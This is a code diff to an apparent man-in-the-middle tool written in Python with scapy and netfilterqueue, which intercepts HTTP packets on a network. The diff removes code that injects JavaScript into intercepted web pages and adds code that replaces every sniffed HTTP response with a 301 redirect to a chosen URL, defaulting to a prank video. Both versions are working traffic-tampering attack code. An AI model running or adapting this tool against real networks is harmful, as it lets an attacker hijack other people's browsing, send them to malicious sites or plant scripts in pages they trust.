@@ -1,4 +1,5 @@
 import argparse
+import functools
 import os
 import re
 
@@ -16,10 +17,8 @@ RED = Fore.RED
 RESET = Style.RESET_ALL
 BRIGHT = Style.BRIGHT
 
-JAVASCRIPT_TO_INJECT = "<script>alert('You've been pwned');</script>"
 
-
-def process_packet(packet):
+def process_packet(packet, url: str) -> None:
     """
     This function is executed whenever a packet is sniffed
     """
@@ -30,50 +29,17 @@ def process_packet(packet):
         if spacket[TCP].dport == 80:
             # HTTP request
             print(f"[*] Detected HTTP Request from {spacket[IP].src} to {spacket[IP].dst}")
-            try:
-                load = spacket[Raw].load.decode()
-            except Exception as e:
-                # raw data cannot be decoded, apparently not HTML
-                # forward the packet exit the function
-                packet.accept()
-                return
-
-            # remove Accept-Encoding header from the HTTP request, so we get a response as a plain text
-            new_load = re.sub(r"Accept-Encoding:.*\r\n", "", load)
-            # set the new data
-            spacket[Raw].load = new_load
-            # set IP length header, checksums of IP and TCP to None
-            # so Scapy will re-calculate them automatically
-            spacket[IP].len = None
-            spacket[IP].chksum = None
-            spacket[TCP].chksum = None
-            # set the modified Scapy packet back to the netfilterqueue packet
-            packet.set_payload(bytes(spacket))
         elif spacket[TCP].sport == 80:
             # HTTP response
             print(f"[*] Detected HTTP Response from {spacket[IP].src} to {spacket[IP].dst}")
             try:
                 load = spacket[Raw].load.decode()
-            except Exception as e:
+            except:
                 packet.accept()
                 return
 
-            added_text = JAVASCRIPT_TO_INJECT
-            added_text_length = len(added_text)
-            # load = load.replace("<body>", "<body>" + added_text)
-
-            # if you want to inject to the end, replace the line above with this one
-            load = load.replace("</body>", added_text + "</body>")
-
-            if "Content-Length" in load:
-                content_length = int(re.search(r"Content-Length: (\d+)\r\n", load).group(1))
-                new_content_length = content_length + added_text_length
-                print("[~] Old content length:", content_length)
-                print("[~] New content length:", new_content_length)
-                load = re.sub(r"Content-Length:.*\r\n", f"Content-Length: {new_content_length}\r\n", load)
-
-            if added_text in load:
-                print(f"{GREEN}[+] Successfully injected code to {spacket[IP].dst}{RESET}")
+            load = f"HTTP/1.1 301 Moved Permanently\r\nLocation: {url}\r\n\r\n"
+            print(f"{GREEN}[+] Successfully redirected {spacket[IP].dst} to url{RESET}")
 
             # set the new data
             spacket[Raw].load = load
@@ -106,7 +72,7 @@ def main(args):
     try:
         print("[*] Creating nfqueue")
         set_iptables()
-        queue.bind(0, process_packet)
+        queue.bind(0, functools.partial(process_packet, url=args.url))
         print(f"{GREEN}[+]{RESET} Started")
         queue.run()
     except KeyboardInterrupt:
@@ -118,7 +84,9 @@ def main(args):
 
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(prog='HTTP packets editor')
+    parser = argparse.ArgumentParser(prog='HTTP redirector')
+    parser.add_argument('-u', '--url', type=str, help="URL to redirect to. Default is rick rolls :)",
+                        default="https://www.youtube.com/watch?v=dQw4w9WgXcQ")
     args = parser.parse_args()
 
     main(args)
